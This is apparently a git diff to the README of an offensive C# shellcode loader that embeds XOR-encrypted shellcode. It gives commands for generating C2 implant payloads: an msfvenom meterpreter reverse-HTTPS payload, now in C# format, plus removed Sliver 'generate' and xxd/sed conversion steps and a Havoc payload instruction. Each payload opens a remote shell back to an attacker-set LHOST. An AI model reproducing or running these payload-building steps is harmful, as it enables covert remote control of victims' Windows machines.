@@ -24,12 +24,7 @@ Your shellcode must be in C# format (see examples below) and then encrypted usin
 Obviously, both the encrypted shellcode and your XOR key must be added in the file 'CsharpShellCodeLoader.cs' before you compile it.
 
 - Metasploit C2 Framework  
-  ```msfvenom -p windows/x64/meterpreter_reverse_https EXITFUNC=thread HandlerSSLCert=/path/cert.pem LHOST=IP LPORT=port -a x64 -f raw -o shellcode```  
-  
-- Sliver C2 Framework  
-  ```[server] sliver > generate --arch amd64 -f shellcode --http IP -l --os Windows --save shellcode```  
-  ```@Kali:/$ xxd -p shellcode | tr -d '\n' | sed 's/.\{2\}/0x&,/g' > shellcode2```  
-  ```@Kali:/$ sed '$ s/.$//' shellcode2 > shellcode3```  
+  ```msfvenom -p windows/x64/meterpreter_reverse_https EXITFUNC=thread HandlerSSLCert=/path/cert.pem LHOST=IP LPORT=port -a x64 -f csharp -o  shellcode```  
   
 - Havoc C2 Framework  
     1. Generate a new HAVOC payload with the format "Windows Shellcode" (Arch: x64 / Indirect Syscall: Enabled / Sleep Technique: WaitForSIngleObjectEx)  
